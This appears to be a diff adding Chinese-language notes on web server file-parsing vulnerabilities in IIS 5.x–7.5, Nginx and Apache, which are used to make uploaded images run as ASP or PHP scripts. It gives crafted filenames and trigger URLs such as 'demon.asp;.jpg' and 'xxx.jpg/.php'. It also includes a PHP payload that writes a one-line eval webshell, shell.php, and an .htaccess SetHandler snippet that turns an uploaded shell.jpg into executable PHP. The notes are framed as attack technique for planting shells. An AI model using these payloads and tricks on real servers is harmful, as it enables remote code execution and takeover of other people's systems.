@@ -1,0 +1,41 @@
+IIS 5.x/6.0 目录解析漏洞
+
+  如果一个目录以 xx.asp 或 xx.asa 命名，那么该目录下的所有文件不管什么后缀都会被当做asp来解析
+
+  比如一个图片被上传到了xx.asp文件，那么 http://www.xxx.com/xx.asp/1.jpg 会被当做asp来解析
+
+
+IIS 5.x/6.0 文件解析漏洞
+  
+  如果文件以 "demon.asp;.jpg" 来命名，那么分号后面的后缀无效，也就是说该文件会以asp脚本来执行
+
+  另外除了后缀以asp结尾的文件会被当做asp脚本来解析外，还有后缀以 asa cer cdx 三种也会被当做asp脚本解析
+
+Apache  多后缀解析漏洞
+
+  如果文件是多后缀名比如 xxx.php.owf.jxl ".owf" 和 ".jxl" Apache 不能识别，因此会继续向左判断下一个后缀名 "php"
+
+  这时候文件就会被解析成php脚本来执行
+
+IIS 7.0/7.5  Nginx<8.03 畸形解析漏洞
+
+  在默认Fast-CGI开启情况下上传一个文件xxx.jpg 内容为：
+  
+   <?php fputs( fopen('shell.php','w'), '<?php eval($_POST[cmd]);?>'); ?>    //使用单引号，否则变量会被解析
+
+   然后访问刚刚的文件 xxx.jpg 访问时将其名字改为 xxx.jpg/.php 然后在目录下就会生成一句话木马 shell.php
+
+   比如访问 http://www.xxx.com/xxx.gif/*.php  触发漏洞，使得图片被服务器php解析
+
+Apache htaccess文件解析漏洞
+ 
+   如果Apache中 .htaccess 可被执行 且可以被上传  那可以尝试在 .htaccess中写入：
+ 
+   <FilesMatch "shell.php">
+      SetHandler application/x-httpd-php
+   </FilesMatch>
+
+   然后再上传shell.jpg 木马，这样图片就会被解析成php脚本
+
+
+  
